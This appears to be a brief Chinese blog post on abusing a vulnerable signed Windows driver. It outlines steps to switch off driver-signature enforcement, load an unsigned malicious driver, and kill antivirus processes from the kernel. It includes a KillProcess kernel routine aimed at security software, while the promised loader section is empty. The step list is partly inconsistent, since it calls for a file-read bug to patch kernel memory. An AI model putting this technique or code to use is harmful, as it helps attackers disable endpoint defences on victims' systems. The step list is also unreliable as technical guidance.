# VulnBins的利用 \(vuln driver\)

## 简介

挺久没水博客了，今个简单写点，现在的杀软越来越"现代化"了，老是尝试免杀已有木马使我疲惫，干脆想重一劳永逸的解决办法，\(自写C2 狗头\),当然这是个体力活，这篇文件简单介绍下白漏洞驱动带起黑驱动，直接从内核干掉杀软。

## 流程

1. 找一个存在任意文件读取的漏洞驱动
2. 加载驱动并漏洞利用修改内核DES位\(作用于驱动签名校验\)
3. 加载黑驱动
4. 漏洞利用改回原值
5. 卸载白驱动

### 代码片段

### 鲨进程 驱动片段

获取当前进程EPROCESS,遍历ActiveProcessLinks获取和判断进程,符合条件就给扬了,当然最好用点强杀手段。

```text
BOOLEAN KillProcess(ULONG PID)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PVOID hProcess;
	PEPROCESS pEprcess;
	ntStatus = PsLookupProcessByProcessId(PID, &pEprcess);

	if (NT_SUCCESS(ntStatus))
	{
		if (ObOpenObjectByPointer((PVOID)pEprcess, 0, NULL, 0, NULL, KernelMode, &hProcess) != STATUS_SUCCESS)
			{return FALSE;}
		ZwTerminateProcess((HANDLE)hProcess, STATUS_SUCCESS);
		ZwClose((HANDLE)hProcess);
		return TRUE;
	}
	return FALSE;
};

```

### Loader

```text

```



